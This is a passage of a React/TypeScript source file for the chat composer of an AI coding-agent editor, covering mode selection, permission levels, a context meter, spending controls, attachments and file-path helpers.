/*--------------------------------------------------------------------------------------
 *  Copyright 2025 Glass Devtools, Inc. All rights reserved.
 *  Licensed under the Apache License, Version 2.0. See LICENSE.txt for more information.
 *--------------------------------------------------------------------------------------*/

import React, { ButtonHTMLAttributes, FormEvent, FormHTMLAttributes, Fragment, KeyboardEvent, useCallback, useEffect, useMemo, useRef, useState } from 'react';


import { useAccessor, useChatThreadsState, useChatThreadsStreamState, useSettingsState, useActiveURI, useCommandBarState, useFullChatThreadsStreamState, useTaskCopyState, usePolicyServiceState } from '../util/services.js';
import { ScrollType } from '../../../../../../../editor/common/editorCommon.js';

import { ChatMarkdownRender, ChatMessageLocation, getApplyBoxId } from '../markdown/ChatMarkdownRender.js';
import { URI } from '../../../../../../../base/common/uri.js';
import { IDisposable } from '../../../../../../../base/common/lifecycle.js';
import { ErrorDisplay } from './ErrorDisplay.js';
import { TextAreaFns, VaderCustomDropdownBox, VaderInputBox2, VaderButtonBgDarken } from '../util/inputs.js';
import { ModelDropdown, } from '../vader-settings-tsx/ModelDropdown.js';
import { ExternalAgentChatPicker } from '../vader-settings-tsx/ExternalAgents.js';
import { PastThreadsList } from './SidebarThreadSelector.js';
import { VADER_CTRL_L_ACTION_ID } from '../../../actionIDs.js';
import { VADER_OPEN_SETTINGS_ACTION_ID } from '../../../actionIDs.js';
import { ChatMode, displayInfoOfProviderName, FeatureName, isFeatureNameDisabled } from '../../../../../../../workbench/contrib/vader/common/vaderSettingsTypes.js';
import { ICommandService } from '../../../../../../../platform/commands/common/commands.js';
import { getModelCapabilities, modelSupportsVision } from '../../../../common/modelCapabilities.js';
import { AlertTriangle, File, Ban, Check, ChevronRight, Dot, FileIcon, Undo, X, Flag, Info, CirclePlus, Ellipsis, CircleEllipsis, Folder, ALargeSmall, TypeOutline, Text } from 'lucide-react';
import { ChatMessage, CheckpointEntry, StagingSelectionItem, ToolMessage } from '../../../../common/chatThreadServiceTypes.js';
import { approvalTypeOfBuiltinToolName, BuiltinToolCallParams, BuiltinToolName, ToolName, LintErrorItem, ToolApprovalType, toolApprovalTypes } from '../../../../common/toolsServiceTypes.js';
import { CopyButton, EditToolAcceptRejectButtonsHTML, IconShell1, JumpToFileButton, JumpToTerminalButton, StatusIndicator, StatusIndicatorForApplyButton, useApplyStreamState, useEditToolStreamState } from '../markdown/ApplyBlockHoverButtons.js';
import { IsRunningType } from '../../../chatThreadService.js';
import { acceptAllBg, acceptBorder, buttonFontSize, buttonTextColor, rejectAllBg, rejectBg, rejectBorder } from '../../../../common/helpers/colors.js';
import { builtinToolNames, isABuiltinToolName, MAX_FILE_CHARS_PAGE, MAX_TERMINAL_INACTIVE_TIME } from '../../../../common/prompt/prompts.js';
import { RawToolCallObj } from '../../../../common/sendLLMMessageTypes.js';
import ErrorBoundary from './ErrorBoundary.js';
import { ToolApprovalTypeSwitch } from '../vader-settings-tsx/ToolApprovalTypeSwitch.js';

import { persistentTerminalNameOfId } from '../../../terminalToolService.js';
import { removeMCPToolNamePrefix } from '../../../../common/mcpServiceTypes.js';
import { formatUsd, formatCost, formatTokens } from '../../../../common/usageAccounting.js';
import { parseTaskList } from '../../../../common/taskList.js';
import { projectNameOf } from '../../../../common/threadProjects.js';
import { contextBreakdown, contextMeterNote, shouldFoldPaste } from '../../../../common/runStateModel.js';
import { BlockedCard, GateCard, SecretBlockedCard } from './GateCards.js';
import { ChoiceMenu } from './ComposerMenus.js';
import { ComposerProjectPicker } from './ComposerProjectPicker.js';
import { ComposerFiles } from './ComposerFiles.js';
import { MessageActions } from './MessageActions.js';
import { translateText } from '../util/i18n/translator.js';
import { CheckpointsButton } from './CheckpointsPanel.js';
import { commandEndWords, foldOutput, lineCount } from '../../../../common/outputFold.js';
import { FoldedOutput } from './FoldedOutput.js';
import { explainBrowserError } from '../../../../common/browserErrorWords.js';
import { explainEditError, rewriteMessage, TRY_AGAIN_MESSAGE } from '../../../../common/editErrorWords.js';
import { checkDrop, DROP_TITLE, dropHint, dropNote, looksBinary, sizeWords } from '../../../../common/attachmentRules.js';
import { ChatImage, checkImages, dataUrlOf, looksLikeImage, MAX_IMAGES } from '../../../../common/imageRules.js';
import { chatImageOfFile, imagesOnClipboard } from './imageFiles.js';
import { ImageChips, ImagesBlockedCard } from './ImageChips.js';
import { SKILLS_FOOTNOTE } from '../../../../common/skillMatch.js'
import { TaskCopyArea } from './TaskCopyCards.js';
import { EditDiffLines, countsOfBlocks } from './EditDiffLines.js';
import { McpToolChangedArea } from './McpToolChanged.js';
import { TerminalWaitingCard } from './TerminalWaitingCard.js';
import { peekContextSources, readContextSource } from './contextSourcesReader.js';
import { attachmentBlock, ContextSourceId } from '../../../../common/contextSources.js';
import { findSecrets, redactSecrets, SecretHit } from '../../../../common/secretScan.js';
import { ContextBanner, FinishedCard, NoModelCard, OfflineBanner, Paste, PastedChips, PausedCard, QueueList, SlashMenu, SlashNote, StoppedCard } from './RunStateCards.js';
import { INIT_PROMPT, noteLabel, parseSlash, slashMatches, SlashCommand } from '../../../../common/slashCommands.js';



export const IconX = ({ size, className = '', ...props }: { size: number, className?: string } & React.SVGProps<SVGSVGElement>) => {
	return (
		<svg
			xmlns='http://www.w3.org/2000/svg'
			width={size}
			height={size}
			viewBox='0 0 24 24'
			fill='none'
			stroke='currentColor'
			className={className}
			{...props}
		>
			<path
				strokeLinecap='round'
				strokeLinejoin='round'
				d='M6 18 18 6M6 6l12 12'
			/>
		</svg>
	);
};

const IconArrowUp = ({ size, className = '' }: { size: number, className?: string }) => {
	return (
		<svg
			width={size}
			height={size}
			className={className}
			viewBox="0 0 20 20"
			fill="none"
			xmlns="http://www.w3.org/2000/svg"
		>
			<path
				fill="black"
				fillRule="evenodd"
				clipRule="evenodd"
				d="M5.293 9.707a1 1 0 010-1.414l4-4a1 1 0 011.414 0l4 4a1 1 0 01-1.414 1.414L11 7.414V15a1 1 0 11-2 0V7.414L6.707 9.707a1 1 0 01-1.414 0z"
			></path>
		</svg>
	);
};


const IconSquare = ({ size, className = '' }: { size: number, className?: string }) => {
	return (
		<svg
			className={className}
			stroke="black"
			fill="black"
			strokeWidth="0"
			viewBox="0 0 24 24"
			width={size}
			height={size}
			xmlns="http://www.w3.org/2000/svg"
		>
			<rect x="2" y="2" width="20" height="20" rx="4" ry="4" />
		</svg>
	);
};


export const IconWarning = ({ size, className = '' }: { size: number, className?: string }) => {
	return (
		<svg
			className={className}
			stroke="currentColor"
			fill="currentColor"
			strokeWidth="0"
			viewBox="0 0 16 16"
			width={size}
			height={size}
			xmlns="http://www.w3.org/2000/svg"
		>
			<path
				fillRule="evenodd"
				clipRule="evenodd"
				d="M7.56 1h.88l6.54 12.26-.44.74H1.44L1 13.26 7.56 1zM8 2.28L2.28 13H13.7L8 2.28zM8.625 12v-1h-1.25v1h1.25zm-1.25-2V6h1.25v4h-1.25z"
			/>
		</svg>
	);
};


export const IconLoading = ({ className = '' }: { className?: string }) => <span role='status' aria-label='Working' data-testid='vader-loading' className={`inline-flex items-center justify-center gap-1 ${className}`} style={{ minWidth: 30, minHeight: 20, verticalAlign: 'middle' }}>
	{[0, 1, 2].map(i => <span key={i} aria-hidden='true' className='size-1.5 rounded-full bg-current motion-safe:animate-pulse' style={{ animationDelay: `${i * 180}ms`, animationDuration: '1.2s', opacity: .65 }} />)}
</span>

const nameOfChatMode = {
	'normal': 'Chat',
	'gather': 'Gather',
	'plan': 'Plan',
	'agent': 'Agent',
}

const detailOfChatMode = {
	'normal': 'Plain conversation, no tools.',
	'gather': 'Read-only. Explores the project and answers.',
	'plan': 'Writes a plan. Changes nothing until you approve it.',
	'agent': 'Reads, edits and runs commands until the task is done.',
}

/** what the empty box says, for the mode it is in (board R01) */
const PLACEHOLDER_OF_MODE: Record<string, string> = {
	'agent': 'Tell the agent what to change, or press / for commands',
	'plan': 'Say what to plan, or press / for commands',
	'gather': 'Ask about the project, or press / for commands',
	'normal': 'Ask anything, or press / for commands',
}


// the order of the board: Agent, Plan, Gather, Chat, with Ctrl 1 to 4 (handled in the message box, see onKeyDown in SidebarChat)
const CHAT_MODE_ORDER: ChatMode[] = ['agent', 'plan', 'gather', 'normal']
const ChatModeDropdown = ({ className }: { className: string }) => {
	const accessor = useAccessor()
	const vaderSettingsService = accessor.get('IVaderSettingsService')
	const settingsState = useSettingsState()
	const rows = useMemo(() => CHAT_MODE_ORDER.map((m, i) => ({ value: m, name: nameOfChatMode[m], detail: detailOfChatMode[m], shortcut: `Ctrl ${i + 1}` })), [])
	return <ChoiceMenu testId='vader-mode' label='Mode' className={className} rows={rows} value={settingsState.globalSettings.chatMode} onChange={(m) => vaderSettingsService.setGlobalSetting('chatMode', m)} />
}

// How much the agent asks before it acts (boards R06 and R08): Safe, Balanced or Autonomous. Some rules are locked in every mode.
const PERMISSION_NAME = { safe: 'Safe', balanced: 'Balanced', autonomous: 'Autonomous' } as const
const PERMISSION_DETAIL = {
	safe: 'Asks before every change and command.',
	balanced: 'Edits in the project go through. Commands and sensitive files ask.',
	autonomous: 'Runs without asking, except what is on the locked list.',
} as const

/** Estimated use of the model's window. The popover explains consumption and does not change the context budget. */
const ContextMeter = () => {
	const settingsState = useSettingsState()
	const threadsState = useChatThreadsState()
	const [open, setOpen] = useState(false)
	const ref = useRef<HTMLDivElement>(null)
	useEffect(() => {
		if (!open) return
		const away = (e: Event) => { if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false) }
		const esc = (e: Event) => { if ((e as { key?: string }).key === 'Escape') setOpen(false) }
		document.addEventListener('mousedown', away)
		document.addEventListener('keydown', esc)
		return () => { document.removeEventListener('mousedown', away); document.removeEventListener('keydown', esc) }
	}, [open])
	const sel = settingsState.modelSelectionOfFeature?.Chat
	if (!sel) return null
	const thread = threadsState.allThreads[threadsState.currentThreadId]
	if (!thread) return null
	const caps = getModelCapabilities(sel.providerName, sel.modelName, settingsState.overridesOfModel)
	const windowTokens = caps.contextWindow
	if (!windowTokens) return null
	// Report estimated consumed tokens against the full model window. The run's
	// input-budget share also reserves the answer and is not a consumption counter.
	const bd = contextBreakdown(thread.messages as never, windowTokens, caps.reservedOutputTokenSpace)
	const tokens = bd.usedTokens
	const pct = Math.min(100, Math.round(100 * tokens / windowTokens))
	const r = 6.5, c = 2 * Math.PI * r
	const color = pct >= 90 ? '#f06a6e' : pct >= 70 ? '#e2a93f' : '#8a8a91'
	const widest = Math.max(1, ...bd.rows.map(x => x.tokens))
	return <div ref={ref} className='relative' onClick={e => e.stopPropagation()}>
		<button type='button' aria-expanded={open} aria-haspopup='dialog' className='flex items-center gap-1.5 text-xs text-vader-fg-3 hover:text-vader-fg-1 transition-colors duration-150' title={`About ${formatTokens(tokens)} of ${formatTokens(windowTokens)} tokens of this model's window`} data-testid='vader-context-meter' onClick={() => setOpen(o => !o)}>
			<svg width='16' height='16' viewBox='0 0 16 16' aria-hidden='true'><circle cx='8' cy='8' r={r} fill='none' stroke='rgba(255,255,255,.14)' strokeWidth='1.8' /><circle cx='8' cy='8' r={r} fill='none' stroke={color} strokeWidth='1.8' strokeLinecap='round' strokeDasharray={`${c * pct / 100} ${c}`} transform='rotate(-90 8 8)' /></svg>
			{pct}%
		</button>
		{open ? <div role='dialog' aria-label='Context' data-testid='vader-context-panel' className='motion-safe:animate-card-in absolute bottom-full right-0 mb-2 z-50 rounded-xl border border-vader-border-2 bg-vader-bg-1 px-4 py-3 shadow-lg flex flex-col gap-2' style={{ width: 300 }}>
			<div className='flex items-baseline gap-2'>
				<span className='font-semibold text-vader-fg-1 text-[13px]' data-testid='vader-context-panel-title'>{pct}% of {formatTokens(windowTokens)}</span>
				<span className='flex-1' />
			</div>
			<div className='h-1 rounded-full bg-vader-border-3 overflow-hidden flex'>
				{bd.rows.map((row, k) => <div key={row.label} title={row.label} style={{ width: `${Math.min(100, 100 * row.tokens / windowTokens)}%`, background: ['#8a8a91', '#5b8def', '#b0b0b5', '#e2a93f'][k % 4] }} />)}
			</div>
			<div className='flex flex-col gap-1 pt-1' data-testid='vader-context-rows'>
				{bd.rows.map(row => <div key={row.label} className='flex items-center gap-2 text-[13px] text-vader-fg-1'>
					<span className='truncate'>{row.label}</span><span className='flex-1' />
					<span className='text-vader-fg-2 tabular-nums' style={{ opacity: 0.6 + 0.4 * row.tokens / widest }}>{formatTokens(row.tokens)}</span>
				</div>)}
			</div>
			<div className='text-vader-fg-3 text-xs leading-relaxed'>{contextMeterNote()}</div>
			<div className='text-vader-fg-3 text-xs leading-relaxed'>Estimates are for the current context, not lifetime token usage. Automatic cleanup uses the input budget after reserving room for the reply.</div>
		</div> : null}
	</div>
}

interface VaderChatAreaProps {
	// Required
	children: React.ReactNode; // This will be the input component

	// Form controls
	onSubmit: () => void;
	onAbort: () => void;
	isStreaming: boolean;
	isDisabled?: boolean;
	divRef?: React.RefObject<HTMLDivElement | null>;

	// UI customization
	className?: string;
	showModelDropdown?: boolean;
	showSelections?: boolean;
	showProspectiveSelections?: boolean;
	loadingIcon?: React.ReactNode;

	selections?: StagingSelectionItem[]
	setSelections?: (s: StagingSelectionItem[]) => void
	// selections?: any[];
	// onSelectionsChange?: (selections: any[]) => void;

	onClickAnywhere?: () => void;
	/** files were dropped on the box (the main message box only) */
	onDropFiles?: (files: File[]) => void;
	/** the main message box: shows the footer line under it and an "Add context" button */
	onAddContext?: () => void;
	showFooter?: boolean;
	// Optional close button
	onClose?: () => void;

	featureName: FeatureName;
}

// Vader addition: Pause or resume a running chat, and what this chat and today have cost (read from the providers' own token counts, see common/usageAccounting.ts)
const RunControls = ({ isStreaming }: { isStreaming: boolean }) => {
	const accessor = useAccessor()
	const chatThreadsService = accessor.get('IChatThreadService')
	const settingsState = useSettingsState()
	const threadId = chatThreadsService.state.currentThreadId
	useChatThreadsStreamState(threadId) // renders again when the run starts, stops, pauses or resumes
	const [, tick] = useState(0)
	useEffect(() => {
		const d = chatThreadsService.onDidChangeUsage(() => tick(n => n + 1))
		return () => d.dispose()
	}, [chatThreadsService])

	const usage = chatThreadsService.getThreadUsage(threadId)
	const today = chatThreadsService.getUsageToday()
	const branch = useTaskCopyState(threadId).state?.branchName
	const limit = settingsState.globalSettings.dailySpendLimitUsd
	const pause = chatThreadsService.getPause(threadId)
	const unpriced = (usage?.unpricedTurns ?? 0) > 0

	return <div className='flex items-center flex-wrap gap-x-3.5 gap-y-0.5 px-1 text-[12px] text-vader-fg-3' data-testid='vader-run-controls'>
		{pause ? <span className='text-yellow-600'>{pause.reason === 'budget' ? `Paused: today's estimate reached ${formatUsd(limit ?? 0)}` : 'Paused'}</span> : null}
		{isStreaming ? (pause
			? <button data-testid='vader-resume' className='underline hover:text-vader-fg-1' onClick={() => chatThreadsService.resumeRun(threadId)}>{pause.reason === 'budget' ? 'Go on anyway' : 'Resume'}</button>
			: <button data-testid='vader-pause' className='underline hover:text-vader-fg-1' onClick={() => chatThreadsService.pauseRun(threadId)}>Pause</button>) : null}
		{usage && usage.turns > 0 ? <span title='Tokens the providers reported for this chat'>{formatTokens(usage.inputTokens + usage.outputTokens)} tokens</span> : null}
		{usage && usage.turns > 0 ? <span title={unpriced ? `${usage.unpricedTurns} answer(s) came from a model whose price Vader does not know, so they are not in this amount. Set a price in Settings, Spending.` : usage.costUsd === 0 ? 'A model on this computer is free' : (usage.billedCostUsd ?? 0) >= usage.costUsd - 1e-9 ? 'The amount the provider says it charged' : 'Worked out from list prices. Your provider\'s bill can differ (discounts, taxes, cache writes). See Settings, Spending.'}>{usage.costUsd === 0 && !unpriced ? 'free' : formatCost(usage.costUsd, usage.billedCostUsd)}{unpriced ? ' +' : ''} this chat</span> : null}
		{today.costUsd > 0 ? <span title='Worked out from list prices unless the provider reported the charge'>{formatCost(today.costUsd, today.billedCostUsd)} today</span> : null}
		<CheckpointsButton />
		<span className='flex-1' />
		{branch ? <span className='font-mono text-[12px] truncate max-w-[40%]' title='The branch this task works on' data-testid='vader-run-branch'>{branch}</span> : null}
	</div>
}

/** Attachment menu beside Add files: uploaded files/photos and context from the project. */
const AttachButton = ({ onFiles, onAddContext }: { onFiles: (files: File[]) => void, onAddContext?: () => void }) => {
	const [open, setOpen] = useState(false)
	const box = useRef<HTMLSpanElement>(null)
	const input = useRef<HTMLInputElement>(null)
	useEffect(() => {
		if (!open) return
		const away = (e: MouseEvent) => { if (!box.current?.contains(e.target as Node)) setOpen(false) }
		const esc = (e: globalThis.KeyboardEvent) => { if (e.key === 'Escape') setOpen(false) }
		document.addEventListener('mousedown', away); document.addEventListener('keydown', esc)
		return () => { document.removeEventListener('mousedown', away); document.removeEventListener('keydown', esc) }
	}, [open])
	return <span ref={box} className='relative inline-flex'>
		<button type='button' data-testid='vader-attach' title='More attachment options' aria-label='More attachment options' aria-haspopup='menu' aria-expanded={open}
			className='flex items-center justify-center h-7 w-7 text-vader-fg-2 hover:text-vader-fg-1 hover:bg-vader-bg-2-hover rounded-md transition-colors duration-150' onClick={e => { e.stopPropagation(); setOpen(v => !v) }}>
			<svg className='size-[12px] flex-none' viewBox='0 0 12 12' fill='none' stroke='currentColor' strokeWidth='1.5' strokeLinecap='round' strokeLinejoin='round' aria-hidden='true'><path d='m3 4.5 3 3 3-3' /></svg>
		</button>
		<input ref={input} type='file' multiple data-testid='vader-attach-input' className='hidden' style={{ display: 'none' }} onChange={e => { const files = Array.from(e.target.files ?? []); e.target.value = ''; setOpen(false); if (files.length > 0) onFiles(files) }} />
		{open ? <div role='menu' data-testid='vader-attach-menu' className='absolute left-0 bottom-9 z-50 flex flex-col p-1 rounded-lg border border-vader-border-2 bg-vader-bg-2 shadow-lg' style={{ width: 270, background: 'var(--g2)', border: '1px solid var(--ln2)', boxShadow: '0 8px 24px rgba(0,0,0,.45)' }}>
			<button type='button' role='menuitem' data-testid='vader-attach-files' className='flex items-center gap-2 h-8 px-2 rounded-md text-[13px] text-vader-fg-1 hover:bg-vader-bg-2-hover text-left' onClick={e => { e.stopPropagation(); input.current?.click() }}>Files and photos from this computer</button>
			{onAddContext ? <button type='button' role='menuitem' data-testid='vader-attach-context' className='flex items-center gap-2 h-8 px-2 rounded-md text-[13px] text-vader-fg-1 hover:bg-vader-bg-2-hover text-left' onClick={e => { e.stopPropagation(); setOpen(false); onAddContext() }}>Add context from the project</button> : null}
		</div> : null}
	</span>
}

export const VaderChatArea: React.FC<VaderChatAreaProps> = ({
	children,
	onSubmit,
	onAbort,
	onClose,
	onClickAnywhere,
	onAddContext,
	onDropFiles,
	showFooter,
	divRef,
	isStreaming = false,
	isDisabled = false,
	className = '',
	showModelDropdown = true,
	showSelections = false,
	showProspectiveSelections = false,
	selections,
	setSelections,
	featureName,
	loadingIcon,
}) => {
	// in a narrow panel the footer keeps one row: "Add context" is then just the @
	const footerRef = useRef<HTMLDivElement>(null)
	const [narrow, setNarrow] = useState(false)
	useEffect(() => {
		const el = footerRef.current
		if (!el || typeof ResizeObserver === 'undefined') return
		const ro = new ResizeObserver(() => setNarrow(el.clientWidth < 470))
		ro.observe(el)
		return () => ro.disconnect()
	}, [])
	// files dragged over the box: the whole box says what will happen (board S03, "Dropping a file")
	const [dragging, setDragging] = useState(false)
	const dragDepth = useRef(0)
	const hasFiles = (e: React.DragEvent) => !!onDropFiles && Array.from(e.dataTransfer?.types ?? []).includes('Files')
	return (
		<div className='flex flex-col gap-1.5'
			onDragEnter={(e) => { if (!hasFiles(e)) return; e.preventDefault(); e.stopPropagation(); dragDepth.current++; setDragging(true) }}
			onDragOver={(e) => { if (!hasFiles(e)) return; e.preventDefault(); e.stopPropagation() }}
			onDragLeave={(e) => { if (!hasFiles(e)) return; dragDepth.current = Math.max(0, dragDepth.current - 1); if (dragDepth.current === 0) setDragging(false) }}
			onDrop={(e) => { if (!hasFiles(e)) return; e.preventDefault(); e.stopPropagation(); dragDepth.current = 0; setDragging(false); onDropFiles?.(Array.from(e.dataTransfer.files)) }}
		>
			<div
				ref={divRef}
				className={`
					gap-y-3.5
	                flex flex-col pt-3 px-3 pb-[9px] relative input text-left shrink-0
	                rounded-[10px]
	                bg-vader-bg-1
				transition-all duration-200
				border border-vader-border-2 focus-within:border-vader-border-1 hover:border-vader-border-1
				max-h-[80vh]
                ${className}
            `}
				onClick={(e) => {
					onClickAnywhere?.()
				}}
			>
				{dragging ? <div data-testid='vader-drop-zone' className='motion-safe:animate-card-in absolute inset-0 z-20 rounded-xl border border-dashed border-vader-border-1 bg-vader-bg-1 flex flex-col items-center justify-center gap-1 pointer-events-none'>
					<svg width='16' height='16' viewBox='0 0 16 16' fill='none' aria-hidden='true' className='text-vader-fg-2'><path d='M8 2v8m0 0L5 7m3 3 3-3M3 13h10' stroke='currentColor' strokeWidth='1.3' strokeLinecap='round' strokeLinejoin='round' /></svg>
					<div className='text-[13px] font-semibold text-vader-fg-1'>{DROP_TITLE}</div>
					<div className='text-xs text-vader-fg-3'>{dropHint()}</div>
				</div> : null}

				{/* Selections section */}
				{showSelections && selections && setSelections && (
					<SelectedFiles
						type='staging'
						selections={selections}
						setSelections={setSelections}
						showProspectiveSelections={showProspectiveSelections}
					/>
				)}

				{/* Input section */}
				<div className="relative w-full">
					{children}

					{/* Close button (X) if onClose is provided */}
					{onClose && (
						<div className='absolute -top-1 -right-1 cursor-pointer z-1'>
							<IconX
								size={12}
								className="stroke-[2] opacity-80 text-vader-fg-3 hover:brightness-95"
								onClick={onClose}
							/>
						</div>
					)}
				</div>

				{/* Bottom row */}
				<div ref={footerRef} data-testid='vader-composer-footer' className='flex flex-row justify-between items-end gap-1'>
					{showModelDropdown && (
						<div className='flex flex-col flex-1 gap-y-1 min-w-0'>
							{/* Context consumption is displayed separately from the mode and model. */}

<div className='flex items-center flex-nowrap min-w-0 gap-x-1 gap-y-1 text-nowrap '>
{featureName === 'Chat' && showFooter ? <span className='inline-flex items-center gap-0 flex-none'><ComposerFiles compact={narrow} />{onDropFiles ? <AttachButton onFiles={onDropFiles} onAddContext={onAddContext} /> : null}</span> : null}
{featureName === 'Chat' && <ChatModeDropdown className='text-[13px] text-vader-fg-2' />}
								{featureName === 'Chat' && <ExternalAgentChatPicker className='text-[13px] text-vader-fg-2 bg-vader-bg-1 rounded' />}
								<ModelDropdown featureName={featureName} className='text-[13px] text-vader-fg-2 bg-vader-bg-1 rounded' />
									{onAddContext ? <button type='button' data-testid='vader-add-context' title='Add context: a file, the terminal output, a page, the git changes' aria-label='Add context' className='flex items-center gap-1.5 h-7 px-1.5 text-[13px] text-vader-fg-2 hover:text-vader-fg-1 hover:bg-vader-bg-2-hover rounded-md transition-colors duration-150' onClick={(e) => { e.stopPropagation(); onAddContext() }}><svg className='size-[15px] flex-none' viewBox='0 0 24 24' fill='none' stroke='currentColor' strokeWidth='1.4' strokeLinecap='round' strokeLinejoin='round' aria-hidden='true'><circle cx='12' cy='12' r='4' /><path d='M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-4 8' /></svg>{narrow ? null : 'Add context'}</button> : null}
							</div>
						</div>
					)}

					<div className="flex flex-none items-center gap-2">
						{showFooter ? <ContextMeter /> : null}

						{isStreaming && loadingIcon}

						{isStreaming ? (
							<ButtonStop onClick={onAbort} />
						) : (
							<ButtonSubmit
								onClick={onSubmit}
								disabled={isDisabled}
							/>
						)}
					</div>

				</div>
			</div>
			{/* what this chat and today have cost, and Pause: under the box, like the interface boards */}
{featureName === 'Chat' && showFooter ? <div className='pt-1.5'><RunControls isStreaming={isStreaming} /></div> : null}
		</div>
	);
};




type ButtonProps = ButtonHTMLAttributes<HTMLButtonElement>
const DEFAULT_BUTTON_SIZE = 22;
export const ButtonSubmit = ({ className, disabled, ...props }: ButtonProps & Required<Pick<ButtonProps, 'disabled'>>) => {

	return <button
		type='button'
		data-testid='vader-send'
		aria-label='Send'
		disabled={disabled}
		className={`rounded-full w-[28px] h-[28px] flex-shrink-0 flex-grow-0 flex items-center justify-center transition-colors duration-150 ml-1.5
			${disabled ? 'bg-vader-bg-2-hover text-vader-fg-4 cursor-default' : 'bg-vader-fg-1 text-black hover:opacity-90 cursor-pointer'}
			${className}
		`}
		{...props}
	>
		<IconArrowUp size={16} className="stroke-[2]" />
	</button>
}

export const ButtonStop = ({ className, ...props }: ButtonHTMLAttributes<HTMLButtonElement>) => {
	return <button
		data-testid='vader-stop'
		aria-label='Stop'
		className={`rounded-md w-7 h-7 flex-shrink-0 flex-grow-0 cursor-pointer flex items-center justify-center ml-1.5
			bg-vader-fg-1 text-black hover:opacity-90 transition-opacity duration-150
			${className}
		`}
		type='button'
		{...props}
	>
		<IconSquare size={12} className="stroke-[3] fill-current" />
	</button>
}



const scrollToBottom = (divRef: { current: HTMLElement | null }) => {
	if (divRef.current) {
		divRef.current.scrollTop = divRef.current.scrollHeight;
	}
};



const ScrollToBottomContainer = ({ children, className, style, scrollContainerRef }: { children: React.ReactNode, className?: string, style?: React.CSSProperties, scrollContainerRef: React.MutableRefObject<HTMLDivElement | null> }) => {
	const [isAtBottom, setIsAtBottom] = useState(true); // Start at bottom

	const divRef = scrollContainerRef

	const onScroll = () => {
		const div = divRef.current;
		if (!div) return;

		const isBottom = Math.abs(
			div.scrollHeight - div.clientHeight - div.scrollTop
		) < 4;

		setIsAtBottom(isBottom);
	};

	// When children change (new messages added)
	useEffect(() => {
		if (isAtBottom) {
			scrollToBottom(divRef);
		}
	}, [children, isAtBottom]); // Dependency on children to detect new messages

	// Initial scroll to bottom
	useEffect(() => {
		scrollToBottom(divRef);
	}, []);

	return (
		<div className='relative flex flex-col flex-1 min-h-0 w-full'>
			<div
				ref={divRef}
				onScroll={onScroll}
				className={className}
				style={style}
			>
				{children}
			</div>
			{/* scrolled up to read: one way back to the newest message */}
			{!isAtBottom ? <button type='button' data-testid='vader-jump-latest' aria-label='Jump to the newest message' onClick={() => { scrollToBottom(divRef); setIsAtBottom(true) }}
				className='absolute left-1/2 bottom-3 -translate-x-1/2 flex items-center gap-1.5 h-8 px-3 rounded-full border border-vader-border-2 bg-vader-bg-1 text-[12.5px] text-vader-fg-2 hover:text-vader-fg-1 hover:bg-vader-bg-2-hover shadow-lg transition-colors duration-150'>
				<svg width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='currentColor' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round' aria-hidden='true'><path d='M12 5v14M5 12l7 7 7-7' /></svg>Newest
			</button> : null}
		</div>
	);
};

export const getRelative = (uri: URI, accessor: ReturnType<typeof useAccessor>) => {
	const workspaceContextService = accessor.get('IWorkspaceContextService')
	let path: string
	const isInside = workspaceContextService.isInsideWorkspace(uri)
	if (isInside) {
		const f = workspaceContextService.getWorkspace().folders.find(f => uri.fsPath?.startsWith(f.uri.fsPath))
		if (f) { path = uri.fsPath.replace(f.uri.fsPath, '') }
		else { path = uri.fsPath }
	}
	else {
		path = uri.fsPath
	}
	return path || undefined
}

export const getFolderName = (pathStr: string) => {
	// 'unixify' path
	pathStr = pathStr.replace(/[/\\]+/g, '/') // replace any / or \ or \\ with /
	const parts = pathStr.split('/') // split on /
	// Filter out empty parts (the last element will be empty if path ends with /)
	const nonEmptyParts = parts.filter(part => part.length > 0)
	if (nonEmptyParts.length === 0) return '/' // Root directory
	if (nonEmptyParts.length === 1) return nonEmptyParts[0] + '/' // Only one folder
	// Get the last two parts
	const lastTwo = nonEmptyParts.slice(-2)
	return lastTwo.join('/') + '/'
}

export const getBasename = (pathStr: string, parts: number = 1) => {
	// 'unixify' path
	pathStr = pathStr.replace(/[/\\]+/g, '/') // replace any / or \ or \\ with /
	const allParts = pathStr.split('/') // split on /
	if (allParts.length === 0) return pathStr
	return allParts.slice(-parts).join('/')
}



// Open file utility function
export const vaderOpenFileFn = (
	uri: URI,
	accessor: ReturnType<typeof useAccessor>,
	range?: [number, number]
) => {
	// in the Vader window a file is looked at on its files page (the classic editor layout is not shown from there)
	const shellService = accessor.get('IVaderShellService')
	if (shellService.state.mode === 'window') { shellService.openFile(uri.fsPath); return }

	const commandService = accessor.get('ICommandService')
	const editorService = accessor.get('ICodeEditorService')

	// Get editor selection from CodeSelection range
	let editorSelection = undefined;

	// If we have a selection, create an editor selection from the range
	if (range) {
		editorSelection = {
			startLineNumber: range[0],
			startColumn: 1,
			endLineNumber: range[1],
			endColumn: Number.MAX_SAFE_INTEGER,
		};
	}

	// open the file
	commandService.executeCommand('vscode.open', uri).then(() => {

		// select the text
		setTimeout(() => {
			if (!editorSelection) return;

			const editor = editorService.getActiveCodeEditor()
			if (!editor) return;

			editor.setSelection(editorSelection)
			editor.revealRange(editorSelection, ScrollType.Immediate)

		}, 50) // needed when document was just opened and needs to initialize

	})

};


export const SelectedFiles = (
	{ type, selections, setSelections, showProspectiveSelections, messageIdx, }:
		| { type: 'past', selections: StagingSelectionItem[]; setSelections?: undefined, showProspectiveSelections?: undefined, messageIdx: number, }
		| { type: 'staging', selections: StagingSelectionItem[]; setSelections: ((newSelections: StagingSelectionItem[]) => void), showProspectiveSelections?: boolean, messageIdx?: number }
) => {

	const accessor = useAccessor()
	const commandService = accessor.get('ICommandService')
	const modelReferenceService = accessor.get('IVaderModelService')




	// state for tracking prospective files
	const { uri: currentURI } = useActiveURI()
	const [recentUris, setRecentUris] = useState<URI[]>([])
	const maxRecentUris = 10
	const maxProspectiveFiles = 3
	useEffect(() => { // handle recent files
		if (!currentURI) return
		setRecentUris(prev => {
			const withoutCurrent = prev.filter(uri => uri.fsPath !== currentURI.fsPath) // remove duplicates
			const withCurrent = [currentURI, ...withoutCurrent]
			return withCurrent.slice(0, maxRecentUris)
		})
	}, [currentURI])
	const [prospectiveSelections, setProspectiveSelections] = useState<StagingSelectionItem[]>([])


	// handle prospective files
	useEffect(() => {
		const computeRecents = async () => {
			const prospectiveURIs = recentUris
